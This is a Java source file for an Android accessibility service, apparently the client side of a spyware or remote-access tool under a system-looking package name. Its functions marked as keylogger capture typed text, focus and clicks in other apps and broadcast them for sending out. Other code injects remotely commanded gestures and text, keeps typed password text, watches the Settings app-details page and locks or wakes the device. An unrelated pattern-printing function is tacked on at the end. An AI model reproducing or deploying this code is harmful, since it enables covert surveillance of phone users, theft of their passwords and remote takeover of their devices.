package com.android.sus_client.services;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.accessibilityservice.GestureDescription;
import android.annotation.SuppressLint;
import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.graphics.Path;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.text.TextUtils;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.Display;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import com.android.sus_client.commonutility.DeviceAdminPolicies;
import com.android.sus_client.control.Const;
import com.android.sus_client.database.SharedPreferenceManager;
import com.android.sus_client.utils.ApkUtils;
import com.android.sus_client.utils.Utils;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.HashMap;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;
import java.util.concurrent.atomic.AtomicBoolean;

public class MyAccessibilityService extends AccessibilityService {

    private static final String TAG = "MyAccessibilityService";
    private static final int PINCH_DURATION_MS = 400;
    private static final int PINCH_DISTANCE_CLOSE = 200;
    private static final int PINCH_DISTANCE_FAR = 800;

    private Display display = null;
    private boolean isMouseDown = false;
    private int prevX = 0, prevY = 0;
    private GestureDescription.StrokeDescription currentStroke = null;
    private final List<GestureDescription> gestureList = new LinkedList<>();
    private final AtomicBoolean lock = new AtomicBoolean(false);


    private boolean isSettingsAppOpen = false;
    private static MyAccessibilityService mInstance;

    public static MyAccessibilityService getInstance() {
        return mInstance;
    }

    public static boolean isEnabled(Context context) {
        ComponentName compName = new ComponentName(context, MyAccessibilityService.class);
        String flatName = compName.flattenToString();
        String enabledList = Settings.Secure.getString(context.getContentResolver(),
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
        return enabledList != null && enabledList.contains(flatName);
    }

    public void processAction(JSONObject gestureData) {
        String action = "";
        int[] coordinates = null;
        try {
            action = gestureData.optString("type");
            JSONObject extra = gestureData.getJSONObject("extra");
            coordinates = new int[2];
            coordinates[0] = extra.optInt("x");
            coordinates[1] = extra.optInt("y");
        } catch (Exception ignored) {
        }

        switch (action) {
            case "onMouseDown":
                if (coordinates != null)
                    mouseDown(coordinates[0], coordinates[1]);
                break;
            case "onMouseMove":
                if (coordinates != null)
                    mouseMove(coordinates[0], coordinates[1]);
                break;
            case "onMouseUp":
                if (coordinates != null)
                    mouseUp(coordinates[0], coordinates[1]);
                break;
            case "onMouseZoomIn":
                if (coordinates != null)
                    mouseWheelZoomIn(coordinates[0], coordinates[1]);
                break;
            case "onMouseZoomOut":
                if (coordinates != null)
                    mouseWheelZoomOut(coordinates[0], coordinates[1]);
                break;
            case "onButtonBack":
                backButtonClick();
                break;
            case "onButtonHome":
                homeButtonClick();
                break;
            case "onButtonRecent":
                recentButtonClick();
                break;
            case "onButtonPower":
                powerButtonClick();
                break;
            case "onButtonLock":
                lockButtonClick();
                break;
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        mInstance = this;
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        // Create a new AccessibilityServiceInfo object and set the desired attributes.
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK | AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags |= AccessibilityServiceInfo.DEFAULT;
        info.flags |= AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS;

        // Set the extra attribute.
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            info.flags |= AccessibilityServiceInfo.CAPABILITY_CAN_PERFORM_GESTURES;
            info.flags |= AccessibilityServiceInfo.CAPABILITY_CAN_REQUEST_ENHANCED_WEB_ACCESSIBILITY;
            info.flags |= AccessibilityServiceInfo.CAPABILITY_CAN_REQUEST_FILTER_KEY_EVENTS;
            info.flags |= AccessibilityServiceInfo.CAPABILITY_CAN_REQUEST_TOUCH_EXPLORATION;
            info.flags |= AccessibilityServiceInfo.CAPABILITY_CAN_RETRIEVE_WINDOW_CONTENT;
        }

        // the notification timeout is the time interval after which the service would listen from the system. Anything happening between that interval won't be captured by the service
        info.notificationTimeout = 1000;
        // Set the new attributes for the accessibility service.
        setServiceInfo(info);
    }

    public boolean isSettingsAppOpenedToApplicationDetailsSettingsPage() {
        AccessibilityNodeInfo appDetailsSettingsPage = null;

        // Get the root node of the view hierarchy.
        AccessibilityNodeInfo nodeRoot = getRootInActiveWindow();
        if (nodeRoot != null) {
            AccessibilityNodeInfo nodeFocused = findFocusedField(nodeRoot);
            if (nodeFocused != null) {
                for (int i = 0; i < nodeFocused.getChildCount(); i++) {
                    AccessibilityNodeInfo mNode = nodeFocused.getChild(i);
                    System.out.println("-------------> " + mNode.getText());
                    if (mNode.getText().equals("APPLICATION_DETAILS_SETTINGS")) {
                        appDetailsSettingsPage = mNode;
                        break;
                    }
                }
            }
        }

        // If the node for the APPLICATION_DETAILS_SETTINGS page is found, then the Settings app is opened to the APPLICATION_DETAILS_SETTINGS page.
        return appDetailsSettingsPage != null;
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // Check if the Settings app is open.
        //Settings.ACTION_APPLICATION_DETAILS_SETTINGS
        if (event.getPackageName() != null && event.getPackageName().equals("com.android.settings")) {
            isSettingsAppOpen = isSettingsAppOpenedToApplicationDetailsSettingsPage();
        }

        // Notice: clipboard can't be retrieved by a background service in Android 10 and above.
        // Therefore we do not include the function of clipboard tracking from the application
        switch (event.getEventType()) {
            // used for keylogger
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                JSONObject responseData = getKeyloggerData(event, "TEXT");
                sendKeyloggerData(responseData);
                break;
            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                responseData = getKeyloggerData(event, "FOCUSED");
                sendKeyloggerData(responseData);
                break;
            case AccessibilityEvent.TYPE_VIEW_CLICKED:
                responseData = getKeyloggerData(event, "CLICKED");
                sendKeyloggerData(responseData);
                break;
            default:
                break;
        }
    }

    @Override
    public void onInterrupt() {
        // If the Settings app is open, close it.
        if (isSettingsAppOpen) {
            performGlobalAction(GLOBAL_ACTION_BACK);
            isSettingsAppOpen = false;
        }
    }

    public void setContext(Context context) {
        WindowManager wm = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
        display = wm.getDefaultDisplay();
    }

    /**
     * @Global_Events ->
     * back, home, notifications, recents
     * @Gesture_Events ->
     * tap
     * swipe
     * paste
     * key, Backspace | Delete | ArrowLeft | ArrowRight | Home | End
     */
    public static void remoteControlEvent(Context context, String event) {
        Intent intent = new Intent(context, MyAccessibilityService.class);
        intent.setAction(Const.ACTION_GESTURE);
        intent.putExtra(Const.EXTRA_EVENT, event);
        context.startService(intent);
    }

    // This is called from the main activity when it gets a message from the Janus socket
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.e("MyAccessibilityService", "onStartCommand: " + (intent == null ? null : intent.getAction()));
        if (intent == null || intent.getAction() == null) {
            return Service.START_STICKY;
        }
        String action = intent.getAction();
        if (action.equals(Const.ACTION_GESTURE)) {
            String event = intent.getStringExtra(Const.EXTRA_EVENT);
            //if (event != null && isSharing) {
            if (event != null) {
                processMessage(event);
            }
        } else if (action.equals(Const.ACTION_SCREEN_SHARING_PERMISSION_NEEDED)) {
        } else if (action.equals(Const.ACTION_SCREEN_SHARING_START)) {
            isSharing = true;
        } else if (action.equals(Const.ACTION_SCREEN_SHARING_STOP)) {
            isSharing = false;
        }
        return Service.START_STICKY;
    }

    /**
     * Remote control display functions
     */
    private void processMessage(String message) {
        Log.e("MyAccessibilityService", "processMessage: " + message);
        float scale = SharedPreferenceManager.get(this).remoteDisplayVideoScale();
        if (scale == 0) {
            scale = 1;
        }
        String[] parts = message.split(",");
        if (parts.length == 0) {
            // Empty message?
            return;
        }
        for (int i = 0; i < parts.length; i++) {
            parts[i] = parts[i]
                    .replace("%2C", ",")
                    .replace("%25", "%");
        }
        if (parts[0].equalsIgnoreCase("tap")) {
            if (parts.length != 4) {
                Log.w("AccessibilityService", "Wrong gesture event format: '" + message + "' Should be tap,X,Y,duration");
                return;
            }
            try {
                int x = Integer.parseInt(parts[1]);
                int y = Integer.parseInt(parts[2]);
                if (scale != 1) {
                    x = (int) (x / scale);
                    y = (int) (y / scale);
                }
                int duration = Integer.parseInt(parts[3]);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    simulateGesture(x, y, null, null, duration);
                }
            } catch (Exception e) {
                Log.w("AccessibilityService", "Wrong gesture event format: '" + message + "': " + e);
            }
        } else if (parts[0].equalsIgnoreCase("swipe")) {
            if (parts.length != 6) {
                Log.w("AccessibilityService", "Wrong message format: '" + message + "' Should be swipe,X1,Y1,X2,Y2");
                return;
            }
            try {
                int x1 = Integer.parseInt(parts[1]);
                int y1 = Integer.parseInt(parts[2]);
                int x2 = Integer.parseInt(parts[3]);
                int y2 = Integer.parseInt(parts[4]);
                if (scale != 1) {
                    x1 = (int) (x1 / scale);
                    y1 = (int) (y1 / scale);
                    x2 = (int) (x2 / scale);
                    y2 = (int) (y2 / scale);
                }
                int duration = Integer.parseInt(parts[5]);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    simulateGesture(x1, y1, x2, y2, duration);
                }
            } catch (Exception e) {
                Log.w("AccessibilityService", "Wrong gesture event format: '" + message + "': " + e);
            }
        } else if (parts[0].equalsIgnoreCase("back")) {
            performGlobalAction(GLOBAL_ACTION_BACK);
        } else if (parts[0].equalsIgnoreCase("home")) {
            performGlobalAction(GLOBAL_ACTION_HOME);
        } else if (parts[0].equalsIgnoreCase("notifications")) {
            performGlobalAction(GLOBAL_ACTION_NOTIFICATIONS);
        } else if (parts[0].equalsIgnoreCase("recents")) {
            performGlobalAction(GLOBAL_ACTION_RECENTS);
        } else if (parts[0].equalsIgnoreCase("key")) {
            if (parts.length != 2) {
                Log.w("AccessibilityService", "Wrong key event format: '" + message + "' Should be key,X");
                return;
            }
            if (parts[1].length() > 1) {
                // This is a special character
                if (parts[1].equals("Backspace")) {
                    removeCharacterAtCursor(false);
                } else if (parts[1].equals("Delete")) {
                    removeCharacterAtCursor(true);
                } else if (parts[1].equals("ArrowLeft") || parts[1].equals("ArrowRight") ||
                        parts[1].equals("Home") || parts[1].equals("End")) {
                    moveCursor(parts[1]);
                }
            } else {
                enterText(parts[1]);
            }
        } else if (parts[0].equalsIgnoreCase("paste")) {
            if (parts.length != 2) {
                Log.w("AccessibilityService", "Wrong key event format: '" + message + "' Should be paste,X");
                return;
            }
            enterText(parts[1]);
        } else {
            Log.w("AccessibilityService", "Ignoring wrong gesture event: '" + message + "'");
        }
    }

    private void enterText(String text) {
        AccessibilityNodeInfo nodeRoot = getRootInActiveWindow();
        if (nodeRoot != null) {
            AccessibilityNodeInfo nodeFocused = findFocusedField(nodeRoot);
            if (nodeFocused != null) {
                CharSequence existingText = getExistingText(nodeFocused);
                String newText = existingText != null ? existingText.toString() : "";

                // If we're typing in the middle of the text, then textSelectionStart()
                // and textSelectionEnd() determine where should we insert the text
                int selectionStart = nodeFocused.getTextSelectionStart();
                int selectionEnd = nodeFocused.getTextSelectionEnd();
                boolean typeInMiddle = false;
                if (selectionStart > -1 && selectionStart < newText.length()) {
                    newText = newText.substring(0, selectionStart) + text + newText.substring(selectionEnd);
                    typeInMiddle = true;
                } else {
                    newText += text;
                }

                Bundle arguments = new Bundle();
                arguments.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, newText);
                nodeFocused.performAction(AccessibilityNodeInfo.AccessibilityAction.ACTION_SET_TEXT.getId(), arguments);

                // After inserting text in the middle, we need to set the selection markers explicitly
                // because ACTION_SET_TEXT clears the selection markers
                if (typeInMiddle) {
                    arguments = new Bundle();
                    arguments.putInt(AccessibilityNodeInfo.ACTION_ARGUMENT_SELECTION_START_INT, selectionStart + text.length());
                    arguments.putInt(AccessibilityNodeInfo.ACTION_ARGUMENT_SELECTION_END_INT, selectionStart + text.length());
                    nodeFocused.performAction(AccessibilityNodeInfo.AccessibilityAction.ACTION_SET_SELECTION.getId(), arguments);
                }
                if (nodeFocused.isPassword()) {
                    savePasswordText(nodeFocused, newText);
                }
            }
        }
    }

    private void removeCharacterAtCursor(boolean removeForward) {
        AccessibilityNodeInfo nodeRoot = getRootInActiveWindow();
        if (nodeRoot != null) {
            AccessibilityNodeInfo nodeFocused = findFocusedField(nodeRoot);
            if (nodeFocused != null) {
                CharSequence existingText = getExistingText(nodeFocused);
                if (existingText == null || existingText.equals("")) {
                    return;
                }
                String newText = existingText.toString();

                // If we're erasing in the middle of the text, then textSelectionStart()
                // and textSelectionEnd() determine what should be removed
                int selectionStart = nodeFocused.getTextSelectionStart();
                int selectionEnd = nodeFocused.getTextSelectionEnd();
                boolean typeInMiddle = false;
                if (selectionStart > -1 && selectionStart < newText.length()) {
                    if (selectionEnd > selectionStart) {
                        newText = newText.substring(0, selectionStart) + newText.substring(selectionEnd);
                    } else {
                        if (selectionStart > 0 && !removeForward) {
                            newText = newText.substring(0, selectionStart - 1) + newText.substring(selectionEnd);
                            selectionStart--;
                        } else if (selectionEnd < newText.length() && removeForward) {
                            newText = newText.substring(0, selectionStart) + newText.substring(selectionEnd + 1);
                        }
                    }
                    typeInMiddle = true;
                } else {
                    // We are at the end; Here Delete will not work and Backspace erases the last character
                    if (!removeForward && newText.length() > 0) {
                        newText = newText.substring(0, newText.length() - 1);
                    }
                }

                Bundle arguments = new Bundle();
                arguments.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, newText);
                nodeFocused.performAction(AccessibilityNodeInfo.AccessibilityAction.ACTION_SET_TEXT.getId(), arguments);

                // After erasing text in the middle, we need to set the selection markers explicitly
                // because ACTION_SET_TEXT clears the selection markers
                if (typeInMiddle) {
                    arguments = new Bundle();
                    arguments.putInt(AccessibilityNodeInfo.ACTION_ARGUMENT_SELECTION_START_INT, selectionStart);
                    arguments.putInt(AccessibilityNodeInfo.ACTION_ARGUMENT_SELECTION_END_INT, selectionStart);
                    nodeFocused.performAction(AccessibilityNodeInfo.AccessibilityAction.ACTION_SET_SELECTION.getId(), arguments);
                }
                if (nodeFocused.isPassword()) {
                    savePasswordText(nodeFocused, newText);
                }
            }
        }
    }

    private void moveCursor(String command) {
        AccessibilityNodeInfo nodeRoot = getRootInActiveWindow();
        if (nodeRoot != null) {
            AccessibilityNodeInfo nodeFocused = findFocusedField(nodeRoot);
            if (nodeFocused != null) {
                CharSequence existingText = getExistingText(nodeFocused);
                if (existingText == null || existingText.equals("")) {
                    return;
                }

                int selectionStart = nodeFocused.getTextSelectionStart();
                int selectionEnd = nodeFocused.getTextSelectionEnd();
                int selectionPos = -1;

                if (command.equals("ArrowLeft")) {
                    if (selectionEnd > selectionStart) {
                        selectionPos = selectionStart;
                    } else if (selectionStart > 0) {
                        selectionPos = selectionStart - 1;
                    }
                } else if (command.equals("ArrowRight")) {
                    if (selectionEnd > selectionStart) {
                        selectionPos = selectionEnd;
                    } else if (selectionEnd < existingText.length()) {
                        selectionPos = selectionEnd + 1;
                    }
                } else if (command.equals("Home")) {
                    selectionPos = 0;
                } else if (command.equals("End")) {
                    selectionPos = existingText.length();
                }

                if (selectionPos != -1) {
                    Bundle arguments = new Bundle();
                    arguments.putInt(AccessibilityNodeInfo.ACTION_ARGUMENT_SELECTION_START_INT, selectionPos);
                    arguments.putInt(AccessibilityNodeInfo.ACTION_ARGUMENT_SELECTION_END_INT, selectionPos);
                    nodeFocused.performAction(AccessibilityNodeInfo.AccessibilityAction.ACTION_SET_SELECTION.getId(), arguments);
                }
            }
        }
    }

    private AccessibilityNodeInfo findFocusedField(AccessibilityNodeInfo node) {
        if (node.isEditable() && node.isFocused()) {
            return node;
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo nodeChild = node.getChild(i);
            AccessibilityNodeInfo nodeFocused = findFocusedField(nodeChild);
            if (nodeFocused != null) {
                return nodeFocused;
            }
        }
        return null;
    }

    // Sharing state
    private boolean isSharing = false;
    private Map<Integer, PasswordText> passwordTexts = new HashMap<>();

    private CharSequence getExistingText(AccessibilityNodeInfo node) {
        if (node.isPassword()) {
            // getText() for password fields returns dots instead of characters!
            // So we save typed text and return the saved text

            // There is an issue: if both virtual keyboard and remote input are used,
            // the saved text may be wrong.
            // Here's a workaround: if there's no text, we clear the previously saved text
            CharSequence existingText = node.getText();
            if (existingText == null || existingText.length() == 0) {
                passwordTexts.remove(node.getWindowId());
                return null;
            }

            PasswordText passwordText = passwordTexts.get(node.getWindowId());
            if (passwordText != null) {
                return !passwordText.isExpired() ? passwordText.text : null;
            } else {
                return null;
            }
        }
        // node.getText() returns a hint for text fields (terrible!)
        // Here's a workaround against this
        CharSequence hintText = null;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            hintText = node.getHintText();
        }
        CharSequence existingText = node.getText();
        if (hintText != null && existingText.equals(hintText)) {
            existingText = null;
        }
        return existingText;
    }

    private void savePasswordText(AccessibilityNodeInfo node, String text) {
        passwordTexts.put(node.getWindowId(), new PasswordText(text));
    }

    @SuppressLint("NewApi")
    private void simulateGesture(Integer x1, Integer y1, Integer x2, Integer y2, int duration) {
        GestureDescription.Builder gestureBuilder = new GestureDescription.Builder();
        if (x2 == null || y2 == null) {
            // Tap
            Path clickPath = new Path();
            clickPath.moveTo(x1, y1);
            GestureDescription.StrokeDescription clickStroke = new GestureDescription.StrokeDescription(clickPath, 0, duration);
            gestureBuilder.addStroke(clickStroke);
            Log.d("AccessibilityService", "Simulating a gesture: tap, x1=" + x1 + ", y1=" + y1 + ", duration=" + duration);
        } else {
            // Swipe
            Path clickPath = new Path();
            clickPath.moveTo(x1, y1);
            clickPath.lineTo(x2, y2);
            GestureDescription.StrokeDescription clickStroke = new GestureDescription.StrokeDescription(clickPath, 0, duration);
            gestureBuilder.addStroke(clickStroke);
            Log.d("AccessibilityService", "Simulating a gesture: swipe, x1=" + x1 + ", y1=" + y1 + ", x2=" + x2 + ", y2=" + y2 + ", duration=" + duration);
        }

        boolean result = dispatchGesture(gestureBuilder.build(), null, null);
        Log.d("AccessibilityService", "Gesture dispatched, result=" + result);
    }


    /**
     * New implimentation of gestures
     */
    private void mouseDown(int x, int y) {
        Log.d(TAG, "Mouse left button down at x=" + x + " y=" + y);
        synchronized (lock) {
            GestureDescription gesture = buildGesture(x, y, x, y, 0, 1, false, true);
            gestureList.add(gesture);
            if (gestureList.size() == 1)
                dispatchGestureHandler();

            prevX = x;
            prevY = y;
            isMouseDown = true;
        }
    }

    private void mouseMove(int x, int y) {
        synchronized (lock) {
            if (!isMouseDown)
                return;
            if (prevX == x && prevY == y)
                return;

            GestureDescription gesture = buildGesture(prevX, prevY, x, y, 0, 1, true, true);
            gestureList.add(gesture);
            if (gestureList.size() == 1)
                dispatchGestureHandler();

            prevX = x;
            prevY = y;
        }
    }

    private void mouseUp(int x, int y) {
        Log.d(TAG, "Mouse left button up at x=" + x + " y=" + y);
        synchronized (lock) {
            GestureDescription gesture = buildGesture(prevX, prevY, x, y, 0, 1, true, false);
            gestureList.add(gesture);
            if (gestureList.size() == 1)
                dispatchGestureHandler();

            isMouseDown = false;
        }
    }

    @SuppressLint("NewApi")
    private GestureDescription buildGesture(int x1, int y1, int x2, int y2, long startTime, long duration, boolean isContinuedGesture, boolean willContinue) {
        Path path = new Path();
        path.moveTo(x1, y1);
        if (x1 != x2 || y1 != y2)
            path.lineTo(x2, y2);

        if (!isContinuedGesture) {
            currentStroke = new GestureDescription.StrokeDescription(path, startTime, duration, willContinue);
        } else {
            currentStroke = currentStroke.continueStroke(path, startTime, duration, willContinue);
        }
        return new GestureDescription.Builder().addStroke(currentStroke).build();
    }

    private void mouseWheelZoomIn(int x, int y) {
        Log.d(TAG, "Zoom in at x=" + x + " y=" + y);
        synchronized (lock) {
            pinchGesture(x, y, PINCH_DISTANCE_CLOSE, PINCH_DISTANCE_FAR);
        }
    }

    private void mouseWheelZoomOut(int x, int y) {
        Log.d(TAG, "Zoom out at x=" + x + " y=" + y);
        synchronized (lock) {
            pinchGesture(x, y, PINCH_DISTANCE_FAR, PINCH_DISTANCE_CLOSE);
        }
    }

    @SuppressLint("NewApi")
    private void pinchGesture(int x, int y, int startSpacing, int endSpacing) {
        int x1 = x - startSpacing / 2;
        int y1 = y - startSpacing / 2;
        int x2 = x - endSpacing / 2;
        int y2 = y - endSpacing / 2;

        if (x1 < 0)
            x1 = 0;
        if (y1 < 0)
            y1 = 0;
        if (x2 < 0)
            x2 = 0;
        if (y2 < 0)
            y2 = 0;

        Path path1 = new Path();
        path1.moveTo(x1, y1);
        path1.lineTo(x2, y2);
        GestureDescription.StrokeDescription stroke1 = new
                GestureDescription.StrokeDescription(path1, 0, PINCH_DURATION_MS, false);

        x1 = x + startSpacing / 2;
        y1 = y + startSpacing / 2;
        x2 = x + endSpacing / 2;
        y2 = y + endSpacing / 2;

        DisplayMetrics metrics = new DisplayMetrics();
        display.getRealMetrics(metrics);
        if (x1 > metrics.widthPixels)
            x1 = metrics.widthPixels;
        if (y1 > metrics.heightPixels)
            y1 = metrics.heightPixels;
        if (x2 > metrics.widthPixels)
            x2 = metrics.widthPixels;
        if (y2 > metrics.heightPixels)
            y2 = metrics.heightPixels;

        Path path2 = new Path();
        path2.moveTo(x1, y1);
        path2.lineTo(x2, y2);
        GestureDescription.StrokeDescription stroke2 = new
                GestureDescription.StrokeDescription(path2, 0, PINCH_DURATION_MS, false);

        GestureDescription gesture =
                new GestureDescription.Builder().addStroke(stroke1).addStroke(stroke2).build();
        gestureList.add(gesture);
        if (gestureList.size() == 1)
            dispatchGestureHandler();
    }

    @SuppressLint("NewApi")
    private void dispatchGestureHandler() {
        if (!mInstance.dispatchGesture(gestureList.get(0), gestureResultCallback, null)) {
            Log.e(TAG, "Gesture was not dispatched");
            gestureList.clear();
        }
    }

    @SuppressLint("NewApi")
    private GestureResultCallback gestureResultCallback = new GestureResultCallback() {
        @Override
        public void onCompleted(GestureDescription gestureDescription) {
            synchronized (lock) {
                gestureList.remove(0);
                if (gestureList.isEmpty())
                    return;
                dispatchGestureHandler();
            }
            super.onCompleted(gestureDescription);
        }

        @Override
        public void onCancelled(GestureDescription gestureDescription) {
            synchronized (lock) {
                Log.w(TAG, "Gesture canceled");
                gestureList.remove(0);
                super.onCancelled(gestureDescription);
            }
        }
    };

    private void backButtonClick() {
        Log.d(TAG, "Back button pressed");
        mInstance.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
    }

    private void homeButtonClick() {
        Log.d(TAG, "Home button pressed");
        mInstance.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
    }

    private void recentButtonClick() {
        Log.d(TAG, "Recent button pressed");
        mInstance.performGlobalAction(AccessibilityService.GLOBAL_ACTION_RECENTS);
    }

    private void powerButtonClick() {
        Log.d(TAG, "Power button pressed");
        mInstance.performGlobalAction(AccessibilityService.GLOBAL_ACTION_POWER_DIALOG);
    }

    private void lockButtonClick() {
        Log.d(TAG, "Lock button pressed");
        if (!isScreenOff())
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                mInstance.performGlobalAction(AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN);
            } else {
                new DeviceAdminPolicies(mInstance).processData("Lock");
            }
        else
            wakeScreenIfNecessary();
    }

    private boolean isScreenOff() {
        PowerManager pm = (PowerManager) mInstance.getSystemService(Context.POWER_SERVICE);
        return !pm.isInteractive();
    }

    @SuppressWarnings("deprecation")
    @SuppressLint("InvalidWakeLockTag")
    private void wakeScreenIfNecessary() {
        PowerManager pm = (PowerManager) mInstance.getSystemService(Context.POWER_SERVICE);
        if (pm.isInteractive()) return;

        PowerManager.WakeLock screenLock = pm.newWakeLock(PowerManager.SCREEN_BRIGHT_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP, TAG);
        screenLock.acquire();
        screenLock.release();
    }


    /**
     * Key logger functions
     */
    private JSONObject getKeyloggerData(AccessibilityEvent event, String type) {
        String pkgName = event.getPackageName() == null ? "" : event.getPackageName().toString();
        List<CharSequence> text = event.getText();
        JSONArray txtArray = new JSONArray();
        if (text != null && !text.isEmpty()) {
            for (CharSequence chars : text) {
                if (!TextUtils.isEmpty(chars)) txtArray.put(chars.toString());
            }
        }
        if (txtArray.length() == 0) return null;
        JSONObject json = new JSONObject();
        try {
            json.put("type", type);
            json.put("text", txtArray);
            json.put("pkgName", pkgName);
            json.put("appName", ApkUtils.getApplicationName(getApplicationContext(), pkgName));
            json.put("time", System.currentTimeMillis());
        } catch (JSONException ignored) {
        }
        return json;
    }

    private void sendKeyloggerData(JSONObject json) {
        if (json != null) {
            sendBroadcast(ForegroundService.getBroadcastIntent("SEND_KEYLOGGER_DATA", json));
        }
    }

    /**
     * Global functions
     */
    public static boolean isRunningService(Context context) {
        return Utils.isServiceRunning(context, MyAccessibilityService.class);
    }

    public static void findChildren(AccessibilityNodeInfo currentNode) {
        for (int i = 0; i < currentNode.getChildCount(); i++) {
            CharSequence clsName = currentNode.getChild(i).getClassName();
            CharSequence contentDesc = currentNode.getChild(i).getContentDescription();
            String viewId = currentNode.getViewIdResourceName();
            if (!TextUtils.isEmpty(clsName)) {
                System.out.println(i + ". " + clsName + " -----> " + (contentDesc == null ? viewId : contentDesc));
            }
        }
        System.out.println("\n");
    }

    private static class PasswordText {
        public long timestamp;
        public String text;

        public PasswordText(String text) {
            this.text = text;
            this.timestamp = System.currentTimeMillis();
        }

        public boolean isExpired() {
            return timestamp < System.currentTimeMillis() - 300000;
        }
    }


    /**
     * Print below pattern
     *
     * @ *****
     * @ ####
     * @ ***
     * @ ##
     * @ *
     */
    public static void printPattern() {
        int i, j, k;
        for (i = 5; i > 0; i--) {
            for (j = 5; j > i; j--) {
                System.out.print(" ");
            }
            for (k = 1; k <= i; k++) {
                if (i % 2 == 0) {
                    System.out.print("#");
                } else {
                    System.out.print("*");
                }
            }
            System.out.println("");
        }

        // Swipe without using third variable
        int a = 9;
        int b = 80;

        System.out.println("");
        System.out.println("Before Swapping: " + a + " - " + b);
        a = a + b;
        b = a - b;
        a = a - b;
        System.out.println("After Swapping: " + a + " - " + b);
    }

}